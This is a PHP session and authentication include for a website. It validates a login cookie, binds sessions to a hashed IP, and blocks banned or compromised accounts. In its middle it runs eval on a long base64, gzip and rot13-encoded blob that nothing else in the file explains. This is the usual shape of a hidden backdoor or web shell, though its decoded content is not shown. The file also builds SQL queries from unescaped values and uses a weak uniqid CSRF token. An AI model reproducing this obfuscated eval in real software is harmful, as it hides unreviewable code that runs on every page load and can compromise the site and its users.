<?php

session_start();

if (!isset($_SESSION['CSRF_TOKEN'])) {
    $_SESSION['CSRF_TOKEN'] = uniqid();
}

$kill = false;

if (isset($_COOKIE['BT_AUTH'])) {
	$token = mysqli_real_escape_string($connect, $_COOKIE['BT_AUTH']);

	$tinfoq = mysqli_query($connect, "SELECT * FROM `session_tokens` WHERE `token`='$token'") or die(mysqli_error($connect));

	if (mysqli_num_rows($tinfoq) > 0) {
		$tinfo = mysqli_fetch_assoc($tinfoq);

		if ($tinfo['ip_address'] == md5($_SERVER['REMOTE_ADDR']) || (mysqli_num_rows(mysqli_query($connect, "SELECT * FROM users WHERE id='{$tinfo['user_id']}' AND vpn_mode='1'")) > 0)) {
			$_SESSION['id'] = $tinfo['user_id'];

		}else {
			setcookie("BT_AUTH", "", time()-3600);
			session_destroy();
			unset($_SESSION['id']);
			$kill = true;
		}
	} else {
		setcookie("BT_AUTH", "", time()-3600);
		session_destroy();
		unset($_SESSION['id']);
		$kill = true;
	}
} else {
	if (isset($_SESSION)) {
		session_destroy();
	}
}

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

$isloggedin = false;

if (!$kill) {
	if (isset($_SESSION['id'])) {
		$isloggedin = true;

		$CURRENT_USER_ID = $_SESSION['id'];

		$_USER = mysqli_fetch_assoc(mysqli_query($connect, "SELECT * FROM users WHERE id='$CURRENT_USER_ID'"));
    if ($_USER['is_banned'] == 1) {
      $fn = basename($_SERVER['SCRIPT_FILENAME'], '.php');
      if ($fn != "banned" && $fn != "reactivate_account") {
        header("Location: /banned.php");
        die();
      }
    }
	}
} else {
	$isloggedin = false;
}

if ($isloggedin) {
  if ($_USER['compromised'] == 1 && ($_SERVER["REQUEST_URI"] != "/api/resendemailcompromised")) {
    die("<html>
      <head>
        <style>
          .bancontainer {
            border: solid 1px;
            width: 35%;
            margin: auto;
            margin-top: 15%;
            margin-bottom: 25%;
            padding: 15px 50px 15px 50px;
            font-family: \"Trebuchet MS\",sans-serif;
          }
        </style>
      </head>

      <body>
        <div class=\"bancontainer\">
          <h2>Account compromised</h2>
          <p>Your account has been flagged as compromised by our activity monitors. <br>Please visit the link sent to the email provided during your registration to recover your account.</p>
          <button onclick=\"document.location = '/Login/Expire'\">Log out</button> <button onclick=\"document.location = '/api/resendemailcompromised'\">Resend email</button>
        </div>
      </body>
    </html>");
  }
}

?>
